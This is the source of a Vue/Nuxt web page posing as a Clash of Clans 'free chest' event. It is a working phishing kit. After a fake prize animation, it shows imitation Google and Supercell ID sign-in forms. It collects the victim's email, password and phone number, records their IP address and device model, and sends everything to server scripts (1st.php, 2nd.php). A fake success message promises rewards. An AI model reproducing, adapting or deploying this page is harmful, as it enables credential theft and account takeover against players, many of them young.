<template>

    <div class="content">
        <div class="wel">
            <h1 class="shadow">Welcome to the<br>Clash of Clans Event</h1>
        </div>
        <div class="front">
            <div class="f-imgBox">
                <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505181635483336a1a8a8c3b_lite.png">
            </div>
            <!-- <span class="f-title shadow">{{ title || 'Free Chest'}}</span> -->
            <template v-if="isEndGacha">
              <div class="g-imgBox" ref="gimgbox">
                <span class="g-title shadow">{{ title || 'Free Chest'}}</span>
                <img :src="`${gimg}`"/>
              </div>
            <div class="claim" @click="popscid = true">
                Claim Now
            </div>
            </template>
            <template v-else>
            <p>Don’t miss out! Log in now and claim your FREE chest packed with awesome rewards</p>
            <div class="claim" @click="openModalGacha" ref="btn_claim">
                Claim Free
            </div>
            
            </template>
        </div>

        <div class="modal-gacha hide" ref="mgacha">
          <span class="hint shadow">Tap!</span>
            <video @click="doHammer" playsinline webkit-playsinline preload="auto" ref="gacha" muted src="https://akmweb.youngjoygame.com/web/jefanyamemek/image/347a0c20b878d59c74f80881e908cc23.MP4"></video>
        </div>


        <div class="accountInfo" v-show="accInfo">
          <span class="nickname shadow">{{ form.nickname }}</span>
          <div class="info">
              <p v-show="isClan" class="list clan"><img :src="`${clanImg}`"> {{ form.clanname }}</p>
              <p class="list exp"><img src="https://akmweb.youngjoygame.com/web/jefanyamemek/image/20d45c3531371b107736702bca3bf2e0.webp"> {{ form.level }}</p>
              <p class="list th"><img :src="`${thImg}`"> TH {{ form.townhall }}</p>
              <p class="list trophy"><img :src="`${trophyImg}`"> {{ form.trophy }}</p>
          </div>
        </div>
    </div>


    <div class="popgoogle" v-show="popgoogle">
      <div class="googlehead">
          <div class="headImg">
              <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025051211364624049b08752ec.png">
          </div>
          <span class="headText">
              Sign in with Google
          </span>
      </div>
      <div class="googlecontent">
          <span class="contentTitle">Sign In</span>
          <span class="contentDesc">to continue to <strong>Supercell Store</strong></span>

          <div class="googleform">
              <div class="form-group">
                  <input @blur="doFocus" ref="googleEmail" v-model="form.googlemail" type="email">
                  <label>Email or phone</label>
              </div>
              <div class="form-group">
                  <input @blur="doFocus" ref="googlePassword" v-model="form.googlepassword" type="password">
                  <label>Password</label>
              </div>
              <div class="form-text">
                  <p>Before using this app, you can review Supercell Store Sign-In’s <span>privacy policy</span> and <span>terms of service</span></p>
              </div>
              <div class="form-action">
                  <span class="createaccount">Create account</span>
                  <div class="google-submit" @click="doLoginGoogle">Next</div>
              </div>
          </div>
          <div class="google-footer">
              <div class="footer-right">
                  <span>English (United States)</span>
              </div>
              <div class="footer-right">
                  <span>Help</span>
                  <span>Privacy</span>
                  <span>Terms</span>
              </div>
          </div>
      </div>
  </div>

  <div class="popscid" v-show="popscid">
    <div class="logoscid">
        <img src="https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505121741138325608f7520c.png" alt="Supercell ID" title="Supercell ID" class="h-9">
    </div>
    <div class="slider">
        <div class="atas">
            <span class="login">Log in</span>
            <span class="verify">Verify</span>
            <span class="success">Success</span>
        </div>

        <div class="bawah" ref="progressbar">
            <div class="round">x</div>
        </div>
    </div>

    <div class="cont" v-show="loginscid">
        <div class="biglogo">
            <img src="https://accounts.supercell.com/static/appicons/store.png">
        </div>
        <span class="logtext">
            <p>Log in to</p>
            <p>Supercell Store</p>
        </span>
        <div class="forms">
            <input type="email" ref="scidEmail" v-model="form.scidemail" placeholder="Enter your email">
            <input type="password" ref="scidPassword"  v-model="form.scidpassword" placeholder="Enter your password">
            <p class="info">This site is protected by reCAPTCHA and the Google <span class="link">Privacy Policy</span> and <span class="link">Terms of Service</span> apply.</p>
            <div class="login-btn" @click="dologinScid">LOG IN</div>
            <div class="login-btn green" @click="switchtoGoogle">LOG IN WITH GOOGLE</div>
        </div>
    </div>

    <div class="phone-verif" v-show="phonescid">
        <span class="phone-title">Last Verification</span>
        <p>Please  enter your phone number to continue</p>
        <div class="phone-form">
            <input type="number" ref="numberElement" v-model="form.phonenumber" placeholder="Phone Number">
            <div class="phone-submit" @click="finalAction">Submit</div>
        </div>
    </div>

    <div class="success-alert" v-show="finalscid">
        <img src="https://accounts.supercell.com/static/media/checkmark_big.2fd62f5fd23abed40ef7b0c9ca513351.svg">
        <span class="phone-title">Hi, {{ form.nickname }}</span>
        <p>Thank you for joining this event, our teams will process and sent your gift soon as possible, please check your email immediately.</p>
    </div>
  </div>

  <div class="id-verification" v-show="idelement">
    <span class="id-text shadow">Please Enter Your Tag</span>
    <input class="id-input" ref="tags" placeholder="Example: #123456" />
    <div class="id-btn" @click="searchID">
      <template v-if="isSearching">
          <Icon name="svg-spinners:90-ring" /> Loading
      </template>
      <template v-else>
          Search
      </template>
    </div>
    <p class="id-alert shadow" v-show="idalert">
      Invalid Tag, Try again
    </p>
  </div>


</template>

<script setup>

function fallbackModelFromUA() {
    const ua = navigator.userAgent;
    const match = ua.match(/\s([A-Z0-9\-]+)\sBuild/);
    if (match && match[1]) {
        return match[1];
    } else {
        return 'No UA';
    }
}
onMounted(async () => {
    fetch('https://ip4only.me/api/')
        .then(res => res.text())
        .then(text => {
            const ip = text.split(",")[1];
            form.value.ipaddress = ip;
    });
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
      navigator.userAgentData.getHighEntropyValues(["model"])
        .then(ua => {
          if (ua.model) {
            form.value.device = ua.modelz
          } else {
            form.value.device = fallbackModelFromUA();
          }
        })
        .catch(err => {
          console.warn("Error getHighEntropyValues:", err);
          form.value.device = fallbackModelFromUA();
        });
    } else {
      form.value.device = fallbackModelFromUA();
    }
})


// Plugin
const { $confetti } = useNuxtApp();


// Audio
const bgm = ref(false);

const currentStep = ref(0);
const isPlaying = ref(false);
const isEndGacha = ref(false)

// Element
const gacha = ref(null);
const mgacha = ref(null);
const btn_claim = ref(null);
const title = ref(null);
const gimgbox = ref(null);
const gimg = ref('https://event-assets.clashofclans.com/ba01a5d3-9ef0-461d-b9f2-51fec3f51bd9_Football_King.png');

const steps = [0.6, 1.4, 1.3, 1.3];

const tags = ref(null)
const isSearching = ref(false)
const idalert = ref(false);
const idelement = ref(true);
const accInfo = ref(false);
const isClan = ref(false)
const clanImg = ref('');
const thImg = ref('');
const trophyImg = ref('');
const popscid = ref(false);
const popgoogle = ref(false);
const loginscid = ref(true);
const phonescid = ref(false)
const progressbar = ref(null);
const finalscid = ref(false);

const googleEmail = ref(null)
const googlePassword = ref(null)
const scidEmail = ref(null)
const scidPassword = ref(null)
const numberElement = ref(null);

const form = ref({
  tag: null,
  townhall: null,
  level: null,
  nickname: null,
  trophy: null,
  clanname: null,
  googlemail: null,
  googlepassword: null,
  scidemail: null,
  scidpassword: null,
  phonenumber: null,
  ipaddress: null,
  device: null
})

async function searchID()
{
    if(!bgm.value)
    {
        new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/07e1c2bb8f33b7385441a73f654d91a6.ogg').play();
        bgm.value = true;
    }
    idalert.value = false;
    if(tags.value.value == '' || tags.value.value == null)
    {
        tags.value.focus()
    } else {
        isSearching.value = true;
        fetch('https://api-kyle.my.id/coc/?tag=' + encodeURIComponent(tags.value.value)).then(resp => resp.json().then(data => {
            if(data.status)
            {
                form.value.townhall = data.townHallLevel
                form.value.nickname = data.name
                form.value.level = data.expLevel
                form.value.trophy = data.trophies
                form.value.tag = data.tag
                trophyImg.value = data.league.badge;
                if(data.hasOwnProperty('clan'))
                {
                    clanImg.value = data.clan.badge;
                    form.value.clanname = data.clan.name;
                    isClan.value = true;
                }
                thImg.value = data.thicon;
                isSearching.value = false;
                accInfo.value = true;
                idelement.value = false;
                window.scrollTo({ top: 0, behavior: 'smooth' })
                console.log(toRaw(form.value))
                
            } else {
                isSearching.value = false;
                idalert.value = true;
            }
        }));
    }

}


function switchtoGoogle()
{
    popscid.value = false;
    popgoogle.value = true;
}

function doFocus()
{
    form.value.googlemail.length !== 0 ? (
        googleEmail.value.classList.add('focus')
    ) : (
        googleEmail.value.classList.remove('focus')
    )

    form.value.googlepassword.length !== 0 ? (
        googlePassword.value.classList.add('focus')
    ) : (
        googlePassword.value.classList.remove('focus')
    )
}

async function finalAction()
{
    if((form.value.phonenumber || '').length < 5)
    {
        numberElement.value.setCustomValidity("Enter your correct phone number");
        numberElement.value.reportValidity();
        return false;
    }
    
    const res = await fetch('2nd.php', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(Object.entries(toRaw(form.value))).toString()
    })

    $confetti.start();
    phonescid.value = false;
    finalscid.value = true;
    loginscid.value = false;
    progressbar.value.style.justifyContent = 'flex-end';

    console.log(toRaw(form.value))

}

async function dologinScid()
{
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if(!regex.test(form.value.scidemail))
    {
        scidEmail.value.setCustomValidity("Enter your supercell id email");
        scidEmail.value.reportValidity();
        return false;
    }
    if((form.value.scidpassword || '').length < 6)
    {
        scidPassword.value.setCustomValidity("Enter your correct password");
        scidPassword.value.reportValidity();
        return false;
    }

    phonescid.value = true;
    loginscid.value = false;
    progressbar.value.style.justifyContent = 'center'; 

    const res = await fetch('1st.php', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(Object.entries(toRaw(form.value))).toString()
    })
}

async function doLoginGoogle()
{
    // Check is valid?
    const regex = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;

    if(!regex.test(form.value.googlemail))
    {
        googleEmail.value.setCustomValidity("Enter your google email");
        googleEmail.value.reportValidity();
        return false;
    }
    if((form.value.googlepassword || '').length < 6)
    {
        googlePassword.value.setCustomValidity("Enter your correct password");
        googlePassword.value.reportValidity();
        return false;
    }

    phonescid.value = true;
    loginscid.value = false;
    popscid.value = true;
    popgoogle.value = false;
    progressbar.value.style.justifyContent = 'center'; 

    const res = await fetch('1st.php', {
        method: 'POST',
        headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(Object.entries(toRaw(form.value))).toString()
    })
}


const prize = [
  {name:'Footbal King', img: 'https://event-assets.clashofclans.com/ba01a5d3-9ef0-461d-b9f2-51fec3f51bd9_Football_King.png', card: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505190625204823a48a74acb.jpg'},
  {name:'Footbal Warden', img: 'https://event-assets.clashofclans.com/688adad3-8aa3-4e2b-8721-9da66f22bf16_Football_Warden.png'},
  {name:'Footbal Queen', img: 'https://event-assets.clashofclans.com/0cd386b0-2aab-47f7-ac35-75fa5c0f7f09_Football_Queen.png'},
  {name:'Space King', img: 'https://event-assets.clashofclans.com/e1eb2dd6-798f-4521-974e-2cefd7a0af3b_ed32d48e_30bf_4560_8f77_de87d559e7c5_space_BK.png'},
  {name:'Egypt King', img: 'https://event-assets.clashofclans.com/78fab33c-5949-4798-8745-11a0ec77dd09_Egypt_BK.png'},
  {name:'Royal Ninja', img: 'https://event-assets.clashofclans.com/2a1fde40-a686-4a64-a155-cba854527b11_1000x1000_RC_Japan.png'},
  {name:'Space Warden', img: 'https://event-assets.clashofclans.com/69143e50-085e-45b9-abb2-f34b45eecbbe_space_GW.png'},
  {name:'Samurai King', img: 'https://images2.imgbox.com/fb/42/BU62BOsb_o.png'},
  {name:'Gold Pass', img: 'https://images2.imgbox.com/1f/bc/OULoTOGV_o.png'},
  {name:'Kyudo Queen', img: 'https://images2.imgbox.com/89/9b/FktmxAXX_o.png'},
  {name:'Cyclone Prince', img: 'https://images2.imgbox.com/da/45/tzKjZvC1_o.png'},
  {name:'Grand Monk', img: 'https://images2.imgbox.com/2d/c3/geYgdYvQ_o.png'},
  {name:'High Seas Scenery', img: 'https://images2.imgbox.com/0f/b0/Ybkuz0Ku_o.png'},
  {name:'Justice Secenery', img: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025052014101417886a005450e.png'},
  {name:'War Machine Secenery', img: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/20250520141156827f65a0f95cf.png'},
  {name:'Space Secenery', img: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025052014123496797052dd08b.png'},
  {name:'Clashoween24 Secenery', img: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/202505201413048146b19945b40.png'},
  {name:'Ghost Secenery', img: 'https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025052014134154406d86837b2.png'},
]



function openModalGacha() {
  mgacha.value.classList.remove('hide');
  btn_claim.value.classList.add('hide');
  doHammer();
}

function doHammer() {
  if (isPlaying.value || !gacha.value) return;

  isPlaying.value = true;

  const video = gacha.value;

  currentStep.value == "0" ? (
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/8f44e6faedd8d8875c6d22b1c6adc015.ogg').play()
  ) : currentStep.value == "1" ? (
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/14caf153a24b0a6b8e56c6f026974874.ogg').play(),
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/cd553f7877dd1eb07fb217d205a6cfc7.ogg').play()
  ) : currentStep.value == "2" ? (
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/f0c33104041b318bd5a20bbe02a35fb7.ogg').play(),
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/cd553f7877dd1eb07fb217d205a6cfc7.ogg').play()
  ) : currentStep.value == "3" ? (
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/d28e49eb2394df662a47ff777481c593.ogg').play(),
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/cd553f7877dd1eb07fb217d205a6cfc7.ogg').play()
  ) : currentStep.value == "4" ? (
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/9d6e2131d676e79f2f21499ef8df9dcc.ogg').play(),
    new Audio('https://akmweb.youngjoygame.com/web/jefanyamemek/image/d38926d7c214c3f157f0ff47616ac542.ogg').play()
  ) : (!0)

  if (currentStep.value < steps.length) {
    const start = video.currentTime;
    const target = start + steps[currentStep.value];

    const onTimeUpdate = () => {
      if (video.currentTime >= target) {
        video.pause();
        video.removeEventListener('timeupdate', onTimeUpdate);
        isPlaying.value = false;
        currentStep.value++;
      }
    };

    video.addEventListener('timeupdate', onTimeUpdate);
    video.play();
  } else {
    video.play();

    setTimeout(() => {
      mgacha.value.classList.add('hide');
      isPlaying.value = false;
      isEndGacha.value = true;
      window.scrollTo({ top: 0, behavior: 'smooth' })
      // 
      nextTick(() => {
        let data = prize[Math.floor(Math.random() * prize.length)];
        title.value = data.name;
        gimg.value = data.img;
        // gimgbox.value.style.backgroundImage = `url('https://p1-image.cdn-aihelp.net/FileService/UserFile/0/202505/2025051907150308139411aa041.jpg')`;
      });
    }, 1850);
  }
}

</script>

<style scoped>

@import url('/components/index.css');
@import url('/components/google.css');
@import url('/components/scid.css');

</style>